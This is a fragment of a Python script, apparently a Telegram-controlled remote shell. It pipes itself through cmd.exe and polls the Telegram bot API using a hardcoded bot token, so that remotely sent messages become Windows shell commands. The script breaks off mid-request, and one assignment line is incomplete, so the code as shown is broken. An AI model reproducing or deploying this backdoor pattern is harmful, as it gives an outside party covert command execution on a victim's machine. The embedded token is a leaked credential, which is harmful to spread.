import requests
import sys
import os
import json
from datetime import datetime
if len(sys.argv)==1:
    os.system("python cmd.py 0 | cmd.exe |python cmd.py 1")
token="7916790982:AAHfrFvAHSYtCw5Qx6DhmdAGcq2yE6H5yYo"
if sys.argv[1]=="0":
    offset=0
    tstart=
    while True:
        print(
            requests.post(
                f"https://api.telegram.org/bot{token}/getUpdates",
                data={
                    
